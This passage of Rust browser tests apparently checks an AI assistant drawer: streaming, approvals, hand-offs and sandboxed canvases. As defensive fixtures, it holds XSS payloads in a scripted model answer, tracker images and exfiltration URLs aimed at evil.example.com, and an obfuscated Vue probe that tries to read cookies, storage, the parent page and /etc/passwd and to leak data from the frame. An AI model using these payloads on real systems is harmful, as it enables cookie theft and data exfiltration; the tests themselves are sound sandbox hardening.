        browser.eval(FETCH_SPY);
        open_drawer(&mut browser);
        assert_eq!(
            browser.eval("!!document.getElementById('m-assist-empty') && !document.getElementById('m-assist-stop')"),
            true
        );
        fake::script(ENDPOINT, vec![slow_text(&["Hello ", "from ", "the scripted ", "model."], 700)]);
        send(&mut browser, "Say hello");
        // the user's message, then the answer as it streams: a part of it before all of it
        browser.wait_for(
            "the user's message",
            "Array.from(document.querySelectorAll('#m-assist-thread [data-assist-item=user]')).some((el) => el.innerText.indexOf('Say hello') >= 0)",
            WAIT,
        );
        let partial = browser.wait_for(
            "a part of the answer",
            &format!("(() => {{ const text = {ANSWERS}; return text.indexOf('Hello') >= 0 && text.indexOf('model.') < 0 ? text : null; }})()"),
            WAIT,
        );
        assert!(partial.as_str().unwrap().starts_with("Hello"), "{partial}");
        assert_eq!(browser.eval("!!document.getElementById('m-assist-stop') && !!document.getElementById('m-assist-status')"), true);
        browser.wait_for(
            "the whole answer and the done line",
            &format!("{ANSWERS} === 'Hello from the scripted model.' && !!document.querySelector('#m-assist-thread [data-assist-item=done][data-state=TASK_STATE_COMPLETED]')"),
            WAIT,
        );
        assert_eq!(browser.eval("!document.getElementById('m-assist-stop') && !document.getElementById('m-assist-status')"), true);
        shots(&mut browser, "thread");
        let conversation_id = convo_of(&mut browser);
        // the turn posted the page, which the conversation's screen session took
        let turn = super::fetched(&mut browser, "the turn", "/assist/turn");
        assert_eq!(turn["status"], 200, "{turn}");
        let screen = field_of(&gate, "moqui.agent.AgentConversation", "conversationId", &conversation_id, "screenStateJson");
        assert!(screen.contains("/apps/gallery/Landing"), "the page state: {screen}");
        assert_clean(&mut browser, "a run streams");

        // a reload while the next answer streams: the drawer opens again on the conversation and the stream goes on
        fake::script(ENDPOINT, vec![slow_text(&["First part. ", "Second part."], 4000)]);
        send(&mut browser, "Take your time");
        browser.wait_for(
            "the first part",
            &format!("{ANSWERS}.indexOf('First part.') >= 0"),
            WAIT,
        );
        browser.reload();
        browser.wait_for(
            "the drawer open again on the conversation",
            &format!("!!document.getElementById('m-assist-drawer') && moqui.assist.state.open && moqui.assist.state.convo.conversationId === {conversation_id:?}"),
            WAIT,
        );
        browser.wait_for(
            "the run's whole answer, once",
            &format!("{ANSWERS} === 'Hello from the scripted model.|First part. Second part.' \
             && document.querySelectorAll('#m-assist-thread [data-assist-item=done][data-state=TASK_STATE_COMPLETED]').length === 2"),
            WAIT,
        );
        assert_eq!(
            browser.eval("Array.from(document.querySelectorAll('#m-assist-thread [data-assist-item=user]')).map((el) => el.innerText.trim()).join('|')"),
            "Say hello|Take your time"
        );
        assert_clean(&mut browser, "a reload re-attaches");
    }

    /// With `webapp_qvt_static_only=true` and a policy without `unsafe-eval` the drawer's components run their precompiled render
    /// functions: it opens, a run streams and its Markdown renders.
    #[test]
    fn the_assist_drawer_works_on_a_static_only_page_in_chromium() {
        let (gate, _reset) = start(
            "browser-assist-static",
            &[("webapp_qvt_static_only", "true")],
            r#"<webapp-list><webapp name="webroot">
                <response-header type="screen-render" name="Content-Security-Policy" value="frame-ancestors 'none'; form-action 'self'; script-src 'self'"/>
            </webapp></webapp-list>"#,
        );
        let base = format!("http://{}", gate.server.address());
        let mut browser = Browser::launch();
        // the screen first, so the login goes back to it (the login page itself is not one of the static-only build's)
        browser.navigate(&format!("{base}/qapps/GateStaticList"));
        browser.wait_for("the login page", "location.pathname === '/Login' && document.readyState === 'complete'", WAIT);
        browser.eval(
            "(() => { const form = document.getElementById('login_form'); form.username.value = 'john.doe'; \
             form.password.value = 'moqui'; form.requestSubmit(); return true; })()",
        );
        browser.wait_event("Page.loadEventFired", WAIT);
        browser.take_problems();
        browser.wait_for(
            "the Assist button",
            "location.pathname === '/qapps/GateStaticList' && !!document.getElementById('m-assist-button') && !!moqui.assist.state.bootstrap \
             && document.body.innerText.indexOf('Enumerations of john.doe') >= 0",
            WAIT,
        );
        assert_eq!(
            browser.eval("!!document.querySelector('script[src*=\"vue.runtime.global.prod.js\"]')"),
            true,
            "the build without the compiler"
        );
        open_drawer(&mut browser);
        fake::script(ENDPOINT, vec![slow_text(&["A **bold** ", "answer."], 300)]);
        send(&mut browser, "Answer in Markdown");
        browser.wait_for(
            "the Markdown answer",
            &format!("!!document.querySelector('#m-assist-thread [data-assist-item=assistant] strong') && {ANSWERS} === 'A bold answer.'"),
            WAIT,
        );
        browser.wait_for(
            "the done line",
            "!!document.querySelector('#m-assist-thread [data-assist-item=done]')",
            WAIT,
        );
        // an answer with images and raw HTML: no image of another host is fetched, the raw HTML is text, and a link no tool
        // returned (answer.references) is plain text
        fake::script(
            ENDPOINT,
            vec![Reply::text(
                "![chart](http://127.0.0.2:9/p.png) <image src=\"http://127.0.0.2:9/i.png\"> <img src=x onerror=\"window.__pwned = 1\"> \
                 <svg><image href=\"http://127.0.0.2:9/s.png\"></image></svg> <a href=\"javascript:window.__pwned = 2\">raw</a> [ok](/qapps/gallery/List) done",
            )],
        );
        send(&mut browser, "Show a picture");
        browser.wait_for("the second answer", &format!("{ANSWERS}.indexOf('done') >= 0"), WAIT);
        assert_eq!(
            browser.eval(
                "(() => { const last = Array.from(document.querySelectorAll('#m-assist-thread [data-assist-item=assistant] .m-assist-markdown')).pop(); \
                 return [last.querySelectorAll('img, image, svg, iframe').length, last.querySelectorAll('[onerror], a[href^=javascript]').length, \
                 !!last.querySelector('.m-assist-image[data-assist-image=\"127.0.0.2\"]'), !last.querySelector('a') && last.innerText.indexOf(' ok done') >= 0, \
                 last.innerText.indexOf('<image src=') >= 0, window.__pwned === undefined].join(','); })()"
            ),
            "0,0,true,true,true,true"
        );
        assert_clean(&mut browser, "a static-only page");
    }

    /// Edit in screen on the gallery's Contact: the page goes to the form with the proposed values filled and Save ringed; the
    /// user's save with a bad email is refused, which the hand-off card reports while it keeps watching; the save with a good one
    /// ends the hand-off and the run goes on with it.
    #[test]
    fn a_gallery_hand_off_reports_the_refused_save_then_saves_in_chromium() {
        let (gate, _reset) = start("browser-assist-handoff", &[], "");
        let base = format!("http://{}", gate.server.address());
        let mut browser = Browser::launch();
        sign_in(&mut browser, &base);
        open_page(&mut browser, &format!("{base}/qapps/gallery/Landing"));
        open_drawer(&mut browser);
        fake::script(
            ENDPOINT,
            vec![
                screen_call(
                    "h1",
                    json!({"go": "/apps/gallery/Contact", "set": {"Name": "Ann Example", "Email": "ann@example.com"}, "do": "Save"}),
                    0,
                ),
                Reply::text("You saved the contact."),
            ],
        );
        send(&mut browser, "Change the contact to Ann");
        let card = "#m-assist-thread [data-assist-card=approval][data-status=pending]";
        browser.wait_for(
            "the approval card with Edit in screen",
            &format!("!!document.querySelector('{card} [data-assist-action=edit]') && document.querySelector('{card}').innerText.indexOf('Ann Example') >= 0"),
            WAIT,
        );
        // the agent followed: the page is the Contact form; the card shows current → proposed
        browser.wait_for("the page followed", "location.pathname === '/qapps/gallery/Contact'", WAIT);
        browser.click("Edit in screen", &format!("document.querySelector('{card} [data-assist-action=edit]')"));
        browser.wait_for(
            "the hand-off: the form filled and Save ringed",
            "(() => { const form = document.querySelector('[name=contactName]'); return !!form && form.value === 'Ann Example' \
             && document.querySelector('[name=emailAddress]').value === 'ann@example.com' && !!document.querySelector('[data-assist-save]') \
             && !!document.querySelector('#m-assist-drawer [data-assist-card=handoff][data-status=watching]'); })()",
            WAIT,
        );
        let handoff_id = browser
            .eval("document.querySelector('[data-assist-card=handoff]').getAttribute('data-handoff-id')")
            .as_str()
            .unwrap_or_default()
            .to_string();
        assert!(!handoff_id.is_empty());
        assert_eq!(
            browser.eval("!!document.querySelector('[data-assist-touched=contactName]')"),
            true,
            "the filled field is marked"
        );
        browser.eval(FETCH_SPY);
        // the user's own save, with an email that does not read: refused on its field, and reported
        browser.eval("(() => { const input = document.querySelector('[name=emailAddress]'); input.focus(); input.select(); return true; })()");
        browser.type_text("ann-at-example");
        browser.click("the ringed Save", "document.querySelector('[data-assist-save]')");
        browser.wait_for(
            "the refused save on its field and in the card",
            "document.body.innerText.indexOf('Enter an email address') >= 0 && \
             document.querySelector('#m-assist-drawer [data-assist-card=handoff]').innerText.indexOf('refused') >= 0",
            WAIT,
        );
        let submitted = super::fetched(&mut browser, "the submitted signal", "/assist/submitted");
        assert_eq!(submitted["status"], 200, "{submitted}");
        assert!(submitted["sent"].to_string().contains("validationErrors"), "{submitted}");
        assert_eq!(field_of(&gate, "moqui.agent.AgentHandoff", "handoffId", &handoff_id, "statusId"), "AghFailed");
        shots(&mut browser, "handoff");
        // fixed and saved: the hand-off is done and the run answers
        browser.eval("(() => { const input = document.querySelector('[name=emailAddress]'); input.focus(); input.select(); return true; })()");
        browser.type_text("ann@example.com");
        browser.click("Save", &by_text("button", "Save"));
        browser.wait_for(
            "the run's answer after the save",
            &format!("{ANSWERS}.indexOf('You saved the contact.') >= 0 && !document.querySelector('#m-assist-drawer [data-assist-card=handoff]') \
             && !!document.querySelector('#m-assist-thread [data-assist-item=done][data-state=TASK_STATE_COMPLETED]')"),
            WAIT,
        );
        assert_eq!(field_of(&gate, "moqui.agent.AgentHandoff", "handoffId", &handoff_id, "statusId"), "AghSaved");
        assert_eq!(browser.eval("!document.querySelector('[data-assist-save]')"), true, "the ring goes with the hand-off");
        // the refused save is answered 500 with its validation errors, as every refused transition is
        let problems = browser.take_problems();
        assert!(
            problems.iter().all(|problem| problem.text.contains("500") && problem.text.contains("saveContact") || problem.text == "request failed, status 500 Internal Server Error"),
            "only the 500 of the refused save: {problems:#?}"
        );
    }

    /// Two tabs on one conversation: the tab that sent the message owns follow and goes where the agent goes; the other shows
    /// "Following in another tab" with the agent's navigation as a chip and stays. A held write shows its approval card in both;
    /// approved in the first, it runs, the record changes and the second tab sees the card executed. Then the user's own
    /// navigation while the agent's command runs wins: the agent's page action, minted for the page before, is a chip.
    #[test]
    fn only_the_owner_tab_follows_and_an_approval_executes_while_a_second_tab_sees_it_in_chromium() {
        let (gate, _reset) = start("browser-assist-tabs", &[], "");
        let base = format!("http://{}", gate.server.address());
        let mut browser = Browser::launch();
        sign_in(&mut browser, &base);
        let owner = browser.first_tab();
        open_page(&mut browser, &format!("{base}/qapps/gallery/Landing"));
        open_drawer(&mut browser);
        fake::script(ENDPOINT, vec![Reply::text("Ready.")]);
        send(&mut browser, "Get ready");
        browser.wait_for("the first answer", &format!("{ANSWERS} === 'Ready.'"), WAIT);
        let conversation_id = convo_of(&mut browser);
        let owner_client = browser.eval("moqui.assist.clientId").as_str().unwrap_or_default().to_string();

        // the second tab, on the conversation by ?assist=
        let other = browser.open_tab();
        open_page(&mut browser, &format!("{base}/qapps/gallery/Detail?enumId=STT_INTERNAL_QUASAR&assist={conversation_id}"));
        browser.wait_for(
            "the conversation in the second tab, followed elsewhere",
            &format!("moqui.assist.state.open && moqui.assist.state.convo.conversationId === {conversation_id:?} && {ANSWERS} === 'Ready.' \
             && !!document.getElementById('m-assist-elsewhere') && document.getElementById('m-assist-elsewhere').innerText.indexOf('Following in another tab') >= 0"),
            WAIT,
        );
        let other_client = browser.eval("moqui.assist.clientId").as_str().unwrap_or_default().to_string();
        assert_ne!(owner_client, other_client, "each tab has its own client id");
        assert_eq!(browser.eval("document.visibilityState"), "visible");

        // the agent goes to the list, then proposes a save; the pause before lets the second tab attach to the run
        browser.use_tab(&owner);
        fake::script(
            ENDPOINT,
            vec![
                screen_call("t1", json!({"go": "/apps/gallery/List"}), 2500),
                screen_call(
                    "t2",
                    json!({"go": "/apps/assistgate/Edit", "set": {"Description": "From Assist"}, "do": "Save"}),
                    0,
                ),
                Reply::text("Changed it."),
            ],
        );
        send(&mut browser, "Open the list, then change the description");
        browser.wait_for("the owner tab followed to the list", "location.pathname === '/qapps/gallery/List'", WAIT);
        let card = "[data-assist-card=approval][data-status=pending]";
        browser.wait_for(
            "the approval card in the owner tab",
            &format!("location.pathname === '/qapps/assistgate/Edit' && !!document.querySelector('{card} [data-assist-action=approve]')"),
            WAIT,
        );
        browser.use_tab(&other);
        browser.wait_for(
            "the approval card in the second tab, which stayed",
            &format!("!!document.querySelector('{card}') && document.querySelector('{card}').innerText.indexOf('From Assist') >= 0"),
            WAIT,
        );
        assert_eq!(browser.eval("location.pathname"), "/qapps/gallery/Detail", "the second tab does not follow");
        browser.wait_for(
            "the agent's navigation as a chip",
            "!!document.querySelector('#m-assist-chips [data-assist-chip=navigate]')",
            WAIT,
        );
        assert_eq!(field_of(&gate, "moqui.basic.EnumerationType", "enumTypeId", "AST_GATE", "description"), "Before");
        shots(&mut browser, "elsewhere");
        browser.use_tab(&owner);
        shots(&mut browser, "approval");

        // approved in the owner tab: it runs, and the second tab sees it executed and the answer
        browser.use_tab(&owner);
        browser.click("Approve", &format!("document.querySelector('{card} [data-assist-action=approve]')"));
        browser.wait_for(
            "the answer after the approval",
            &format!("{ANSWERS}.indexOf('Changed it.') >= 0 && !!document.querySelector('[data-assist-card=approval][data-status=executed]')"),
            WAIT,
        );
        assert_eq!(field_of(&gate, "moqui.basic.EnumerationType", "enumTypeId", "AST_GATE", "description"), "From Assist");
        browser.use_tab(&other);
        browser.wait_for(
            "the second tab sees it executed",
            &format!("!!document.querySelector('[data-assist-card=approval][data-status=executed]') && {ANSWERS}.indexOf('Changed it.') >= 0"),
            WAIT,
        );
        assert_eq!(browser.eval("location.pathname"), "/qapps/gallery/Detail");
        assert_clean(&mut browser, "two tabs and an approval");

        // the user moves while the agent's command runs: the page stays where the user went
        browser.use_tab(&owner);
        fake::script(
            ENDPOINT,
            vec![screen_call("t3", json!({"go": "/apps/assistgate/Slow"}), 0), Reply::text("Opened the slow screen.")],
        );
        send(&mut browser, "Open the slow screen");
        browser.wait_for(
            "the agent's command running",
            "!!document.querySelector('#m-assist-thread [data-assist-item=step][data-tool=screen][data-status=running]')",
            WAIT,
        );
        browser.eval("(() => { moqui.webrootVue.setUrl('/qapps/gallery/Landing'); return true; })()");
        browser.wait_for("the user's page", "location.pathname === '/qapps/gallery/Landing'", WAIT);
        browser.wait_for(
            "the run done, the agent's navigation a chip",
            &format!("{ANSWERS}.indexOf('Opened the slow screen.') >= 0 && !!document.querySelector('#m-assist-chips [data-assist-chip=navigate]')"),
            WAIT,
        );
        browser.pump(Duration::from_millis(1500));
        assert_eq!(browser.eval("location.pathname"), "/qapps/gallery/Landing", "the user's navigation wins");
        assert_clean(&mut browser, "user navigation wins over follow");

        // Edit in screen from the tab that does not follow, after it moved on its own (so its page version is ahead of the
        // server's, which it never reported): the hand-off's page events are for it, and it follows them
        fake::script(
            ENDPOINT,
            vec![
                screen_call(
                    "t4",
                    json!({"go": "/apps/assistgate/Edit", "set": {"Description": "Handed over"}, "do": "Save"}),
                    0,
                ),
                Reply::text("You saved it."),
            ],
        );
        send(&mut browser, "Change it again");
        browser.wait_for(
            "the second approval in the owner tab",
            &format!("location.pathname === '/qapps/assistgate/Edit' && !!document.querySelector('{card}')"),
            WAIT,
        );
        browser.use_tab(&other);
        browser.eval("(() => { moqui.webrootVue.setUrl('/qapps/gallery/List'); return true; })()");
        browser.wait_for("the second tab moved", "location.pathname === '/qapps/gallery/List'", WAIT);
        browser.click(
            "Edit in screen in the second tab",
            &format!("document.querySelector('{card} [data-assist-action=edit]')"),
        );
        browser.wait_for(
            "the second tab follows the hand-off",
            "location.pathname === '/qapps/assistgate/Edit' && !!document.querySelector('[name=description]') \
             && document.querySelector('[name=description]').value === 'Handed over'",
            WAIT,
        );
        browser.wait_for(
            "the hand-off's Save ringed, and this tab follows",
            "!!document.querySelector('[data-assist-save]') && !document.getElementById('m-assist-elsewhere')",
            WAIT,
        );
        browser.click("the ringed Save", "document.querySelector('[data-assist-save]')");
        browser.wait_for("the run after the user's save", &format!("{ANSWERS}.indexOf('You saved it.') >= 0"), WAIT);
        assert_eq!(field_of(&gate, "moqui.basic.EnumerationType", "enumTypeId", "AST_GATE", "description"), "Handed over");
        browser.use_tab(&owner);
        assert_eq!(browser.eval("location.pathname"), "/qapps/assistgate/Edit", "the first tab stays");
        browser.wait_for("the first tab follows elsewhere now", "!!document.getElementById('m-assist-elsewhere')", WAIT);
        assert_clean(&mut browser, "Edit in screen from the other tab");
    }

    /// A tool call of the fake model with `arguments`, then the finish that runs it.
    fn tool_call(id: &str, name: &str, arguments: serde_json::Value) -> Reply {
        Reply::steps(vec![
            Step::Tool {
                id: id.to_string(),
                name: name.to_string(),
                arguments: arguments.to_string(),
                pieces: 4,
            },
            Step::Finish("tool_calls".to_string()),
        ])
    }

    /// The canvas (plan 13.6): write_ui after the skill shows a program over the page while the drawer stays docked; its Query
    /// reads a screen list through the read proxy; a click on its Save button runs the program's Mutation with the values on
    /// the canvas, the click being the approval (no card); the agent's own run of the Mutation, with no click, is an approval
    /// card, and approving it runs it; Back to the page shows the screen again.
    #[test]
    fn the_canvas_shows_over_the_page_and_a_canvas_mutation_yields_a_card_in_chromium() {
        let (gate, _reset) = start("browser-assist-canvas", &[], "");
        let base = format!("http://{}", gate.server.address());
        let mut browser = Browser::launch();
        sign_in(&mut browser, &base);
        open_page(&mut browser, &format!("{base}/qapps/assistgate/Edit"));
        browser.eval(FETCH_SPY);
        open_drawer(&mut browser);
        let program = "root = Stack([CardHeader(\"Groups and the gate type\"), note, table, FormControl(\"Description\", Input(\"description\", $description)), saveButton])\n\
            note = MarkDownRenderer(\"See ![the tracker](https://evil.example.com/p.png?d=x) and [a site](https://evil.example.com/?d=x).\")\n\
            $description = \"\"\n\
            groups = Query(\"request\", {path: \"/apps/system/Security/UserGroup/UserGroupList\", query: {userGroupId: \"ADMIN\"}}, {rows: []})\n\
            table = Table([Col(\"Group\", groups.rows.userGroupId), Col(\"Description\", groups.rows.description)])\n\
            save = Mutation(\"request\", {method: \"POST\", path: \"/apps/assistgate/Edit/updateEnumType\", body: {enumTypeId: \"AST_GATE\", description: $description}})\n\
            saveButton = Button(\"Save\", Action([@Run(save)]))";
        fake::script(
            ENDPOINT,
            vec![
                tool_call("s1", "skill", json!({"name": "openui-lang"})),
                tool_call("w1", "write_ui", json!({"title": "Gate canvas", "program": program})),
                Reply::text("The canvas is open."),
            ],
        );
        send(&mut browser, "Show the groups and a form for the gate type in a canvas");
        browser.wait_for(
            "the canvas over the page with the Query's row",
            "(() => { const el = document.getElementById('m-assist-canvas'); return !!el && el.getAttribute('data-version') === '1' \
             && el.innerText.indexOf('ADMIN') >= 0 && !!document.querySelector('[data-assist-canvas-button=Save]'); })()",
            WAIT,
        );
        // the page is under it, the drawer docked beside it
        assert_eq!(
            browser.eval("!!document.getElementById('m-assist-drawer') && moqui.assist.state.open && !document.querySelector('form[id^=EditEnumType]')?.offsetParent"),
            true
        );
        let read = super::fetched(&mut browser, "the read proxy", "/assist/read");
        assert_eq!(read["status"], 200, "{read}");
        // the canvas's Markdown is strict: the remote image is a placeholder and the external link is text, nothing fetched
        browser.wait_for("the canvas's Markdown", "!!document.querySelector('#m-assist-canvas [data-assist-image]')", WAIT);
        assert_eq!(
            browser.eval("document.querySelectorAll('#m-assist-canvas img').length + document.querySelectorAll('#m-assist-canvas a[href^=\"http\"]').length"),
            0
        );
        assert_eq!(
            browser.eval("performance.getEntriesByType('resource').filter((entry) => entry.name.indexOf('evil.example.com') >= 0).length"),
            0
        );
        // the Button says what it saves
        assert_eq!(
            browser.eval("(document.querySelector('[data-assist-canvas-saves]') || {}).innerText"),
            "saves: updateEnumType"
        );
        browser.wait_for("the answer", &format!("{ANSWERS}.indexOf('The canvas is open.') >= 0"), WAIT);
        shots(&mut browser, "canvas");

        // a click on Save: the program's Mutation with the canvas's value, no card
        browser.click("the description", "document.querySelector('#m-assist-canvas input[name=description]')");
        browser.type_text("Clicked on the canvas");
        // a scripted click is not the user's: nothing is armed and nothing runs
        browser.eval("document.querySelector('[data-assist-canvas-button=Save]').click(), true");
        browser.pump(Duration::from_millis(800));
        assert_eq!(browser.eval("window.__gate.fetches.filter((f) => f.url.indexOf('/assist/canvasAction') >= 0).length"), 0);
        assert_eq!(field_of(&gate, "moqui.basic.EnumerationType", "enumTypeId", "AST_GATE", "description"), "Before");
        browser.click("Save", "document.querySelector('[data-assist-canvas-button=Save]')");
        let start = std::time::Instant::now();
        while field_of(&gate, "moqui.basic.EnumerationType", "enumTypeId", "AST_GATE", "description") != "Clicked on the canvas" {
            assert!(start.elapsed() < WAIT, "the click's write did not run");
            browser.pump(Duration::from_millis(200));
        }
        let action = super::fetched(&mut browser, "the canvas action", "/assist/canvasAction");
        assert_eq!(action["status"], 200, "{action}");
        assert_eq!(browser.eval("document.querySelectorAll('[data-assist-card=approval]').length"), 0, "a click asks no card");

        // the agent runs the Mutation itself: a card, and the write waits for it
        let posted = browser.eval("window.__gate.fetches.filter((f) => f.url.indexOf('/assist/canvasState') >= 0).length");
        browser.click("the description", "document.querySelector('#m-assist-canvas input[name=description]')");
        browser.eval("(() => { const input = document.querySelector('#m-assist-canvas input[name=description]'); input.select(); return true; })()");
        browser.type_text("Proposed by the agent");
        // the canvas's values reach the server (canvasState, a second after the last change)
        browser.wait_for(
            "the canvas state posted",
            &format!("window.__gate.fetches.filter((f) => f.url.indexOf('/assist/canvasState') >= 0 && f.status === 200).length > {posted}"),
            WAIT,
        );
        fake::script(ENDPOINT, vec![tool_call("r1", "write_ui", json!({"run": "save"})), Reply::text("Saved it for you.")]);
        send(&mut browser, "Save it for me");
        let card = "[data-assist-card=approval]";
        browser.wait_for(
            "the approval card of the agent's Mutation",
            &format!("(() => {{ const el = document.querySelector('{card}'); return !!el && el.innerText.indexOf('Proposed by the agent') >= 0; }})()"),
            WAIT,
        );
        assert_eq!(field_of(&gate, "moqui.basic.EnumerationType", "enumTypeId", "AST_GATE", "description"), "Clicked on the canvas");
        shots(&mut browser, "canvas-card");
        browser.click("Approve", &format!("document.querySelector('{card} [data-assist-action=approve]')"));
        browser.wait_for("the run after the approval", &format!("{ANSWERS}.indexOf('Saved it for you.') >= 0"), WAIT);
        assert_eq!(field_of(&gate, "moqui.basic.EnumerationType", "enumTypeId", "AST_GATE", "description"), "Proposed by the agent");

        // Back to the page: the screen again, and the canvas a button away
        browser.click("Back to the page", "document.getElementById('m-assist-canvas-back')");
        browser.wait_for(
            "the page again",
            "!document.getElementById('m-assist-canvas') && !!document.getElementById('m-assist-show-canvas')",
            WAIT,
        );
        assert_clean(&mut browser, "the canvas");
    }

    /// Set `field` of the row `id` of `entity` (through the entity facade, so its cache is cleared).
    fn set_field(gate: &Gate, entity: &str, key: &str, id: &str, field: &str, value: &str) {
        let factory = gate.server.factory();
        let ctx = factory.new_context();
        let _entered = ctx.enter();
        let _authz = ctx.disable_authz();
        let facade = factory.entity().unwrap();
        let mut row = facade.find(entity).unwrap().eq(key, Value::string(id)).one().unwrap().expect("the row");
        row.set(field, Value::string(value));
        row.update(&facade).unwrap();
    }

    /// The data part of the conversation's canvas (its state and problems), as the server keeps it.
    fn canvas_data(gate: &Gate) -> serde_json::Value {
        let factory = gate.server.factory();
        let ctx = factory.new_context();
        let _entered = ctx.enter();
        let _authz = ctx.disable_authz();
        let facade = factory.entity().unwrap();
        let canvas = facade
            .find("moqui.agent.AgentArtifact")
            .unwrap()
            .eq("artifactKind", Value::string("canvas"))
            .order_by("lastUpdatedDate", true)
            .limit(1)
            .list()
            .unwrap()
            .values()
            .first()
            .cloned();
        let Some(canvas) = canvas else { return serde_json::Value::Null };
        let id = canvas.get("artifactId").map(to_plain_string).unwrap_or_default();
        facade
            .find("moqui.agent.AgentArtifactPart")
            .unwrap()
            .eq("artifactId", Value::string(&id))
            .eq("partSeq", Value::I64(2))
            .one()
            .unwrap()
            .and_then(|row| row.get("dataJson").map(to_plain_string))
            .and_then(|text| serde_json::from_str(&text).ok())
            .unwrap_or(serde_json::Value::Null)
    }

    /// A Vue SFC canvas that probes its frame from inside: the page, the cookies and the storage, popups and the top
    /// window, the network (fetch, XHR, a WebSocket, an image of another site and one of this site outside its static
    /// paths), a form post, reads through the bridge (a list, a transition that writes, a path with .., another host),
    /// and a submit on mount with no click. The probes reach the frame's globals through computed names, as code that
    /// slips past the server's checks would; the results come back as a value of the canvas.
    const PROBE: &str = r#"<template>
  <div>
    <q-btn id="probe-save" color="primary" label="Save from the frame" style="width:100%;height:64px" @click="save"></q-btn>
    <div id="probe-state">{{ done ? 'probed' : 'probing' }}</div>
    <a id="probe-link" href="/apps/assistgate/Edit">The edit screen</a>
  </div>
</template>

<script>
module.exports = {
  props: { values: Object },
  data: function () { return { done: false }; },
  mounted: function () {
    var vm = this;
    var W = this.$el['owner' + 'Document']['default' + 'View'];
    var D = W['docu' + 'ment'];
    var out = {};
    function t(name, fn) { try { var v = fn(); out[name] = 'ALLOWED:' + String(v).slice(0, 60); } catch (e) { out[name] = 'blocked'; } }
    t('parentDocument', function () { return W.parent.document.title; });
    t('topLocation', function () { return W.top.location.href; });
    t('cookie', function () { return D.cookie; });
    t('localStorage', function () { return W.localStorage.length; });
    t('sessionStorage', function () { return W.sessionStorage.length; });
    t('moquiGlobal', function () { if (typeof W.moqui === 'undefined') throw new Error('absent'); return 'present'; });
    t('openWindow', function () { var w = W.open('about:blank'); if (!w) throw new Error('blocked'); return 'opened'; });
    t('navigateTop', function () { W.top.location = 'about:blank'; return 'navigated'; });
    out.origin = W.origin;
    var waits = [];
    function settle(name, start) { waits.push(new Promise(function (resolve) { start(function (value) { out[name] = value; resolve(); }); })); }
    settle('fetch', function (done) { W.fetch('/apps/assistgate/Edit').then(function () { done('ALLOWED'); }, function () { done('blocked'); }); });
    settle('xhr', function (done) { try { var x = new W.XMLHttpRequest(); x.open('GET', '/Login'); x.onload = function () { done('ALLOWED'); }; x.onerror = function () { done('blocked'); }; x.send(); } catch (e) { done('blocked'); } });
    settle('socket', function (done) { try { var s = new W.WebSocket('ws://' + W.location.host + '/notws'); s.onopen = function () { done('ALLOWED'); }; s.onerror = function () { done('blocked'); }; } catch (e) { done('blocked'); } });
    settle('imageOther', function (done) { var i = new W.Image(); i.onload = function () { done('ALLOWED'); }; i.onerror = function () { done('blocked'); }; i.src = 'https://evil.example.com/p.png?d=x'; });
    settle('imageSite', function (done) { var i = new W.Image(); i.onload = function () { done('ALLOWED'); }; i.onerror = function () { done('blocked'); }; i.src = '/favicon.ico?d=x'; });
    settle('form', function (done) { var f = D.createElement('form'); f.method = 'POST'; f.action = '/apps/assistgate/Edit/updateEnumType'; D.body.appendChild(f); try { f.submit(); } catch (e) { } setTimeout(function () { done('blocked'); }, 600); });
    settle('readList', function (done) { vm.$bridge.get('/apps/system/Security/UserGroup/UserGroupList', { userGroupId: 'ADMIN' }).then(function (r) { done('rows ' + (r.rows || []).map(function (row) { return row.userGroupId; }).join(',')); }, function (e) { done('ERR ' + e.message); }); });
    settle('readWrite', function (done) { vm.$bridge.get('/apps/assistgate/Edit/updateEnumType', { enumTypeId: 'AST_GATE', description: 'Read write' }).then(function () { done('ALLOWED'); }, function (e) { done('refused: ' + e.message); }); });
    settle('readDots', function (done) { vm.$bridge.get('/apps/../etc/passwd').then(function () { done('ALLOWED'); }, function (e) { done('refused: ' + e.message); }); });
    settle('readHost', function (done) { vm.$bridge.get('https://evil.example.com/x').then(function () { done('ALLOWED'); }, function (e) { done('refused: ' + e.message); }); });
    settle('readUndeclared', function (done) { vm.$bridge.get('/apps/system/Security/UserAccount/UserAccountList').then(function () { done('ALLOWED'); }, function (e) { done('refused: ' + e.message); }); });
    settle('autoSubmit', function (done) { vm.$bridge.submit('save', { description: 'Submitted on mount' }).then(function (r) { done(r.status); }, function (e) { done('ERR ' + e.message); }); });
    t('webrtc', function () { var R = W.RTCPeerConnection || W.webkitRTCPeerConnection; if (!R) throw new Error('gone'); return new R({ iceServers: [{ urls: 'stun:' + out.readList }] }); });
    Promise.all(waits).then(function () { vm.done = true; vm.$emit('input', { probes: JSON.stringify(out) }); });
  },
  methods: {
    save: function () { this.$bridge.submit('save', { description: 'Clicked in the frame' }); }
  }
};
</script>

<actions>
[{"name": "save", "label": "Save the gate type", "path": "/apps/assistgate/Edit/updateEnumType", "fields": ["description"],
  "parameters": {"enumTypeId": "AST_GATE"}}]
</actions>

<reads>
["/apps/system/Security/UserGroup/UserGroupList"]
</reads>"#;

    /// A canvas that navigates its own frame to send what it read in a URL, past the server's checks (a computed name).
    const NAVIGATES: &str = r#"<template><div id="nav-probe">leaving</div></template>
<script>
module.exports = {
  mounted: function () {
    var W = this.$el['owner' + 'Document']['default' + 'View'];
    setTimeout(function () { W['loca' + 'tion'].href = '/assist/sandbox?d=' + encodeURIComponent('what it read'); }, 300);
  }
};
</script>"#;

    /// The Vue SFC canvas (plan 13.8; the probes of Java's `framework/test/vue_sfc_sandbox_browser_smoke.py`): for an agent
    /// whose `canvasDialects` name vue-sfc, `write_ui` of kind vue-sfc after its skill draws the component in a frame of
    /// `/assist/sandbox` (its own CSP) with an opaque origin; from inside, the page's DOM, the cookies, the storage, popups and
    /// the top window are out of reach, the network is blocked (fetch, XHR, a WebSocket, another site's image, a form), reads
    /// through the bridge reach the read proxy (a list is read, a transition that writes is refused, and paths that are not
    /// /apps are refused by the parent); a submit with no click is ignored; a click in the frame asks a confirm drawn outside
    /// it, which a scripted click does not pass and the user's click saves; a canvas that navigates its frame is closed and
    /// the attempt recorded as a canvas problem of the sandbox section.
    #[test]
    fn a_vue_sfc_canvas_runs_sandboxed_and_holds_the_java_probes_in_chromium() {
        let (gate, _reset) = start("browser-assist-sfc", &[], "");
        set_field(&gate, "moqui.agent.AgentDefinition", "agentId", "assist", "canvasDialects", "openui,vue-sfc");
        let base = format!("http://{}", gate.server.address());
        let mut browser = Browser::launch();
        sign_in(&mut browser, &base);
        open_page(&mut browser, &format!("{base}/qapps/assistgate/Edit"));
        browser.eval(FETCH_SPY);
        assert_eq!(
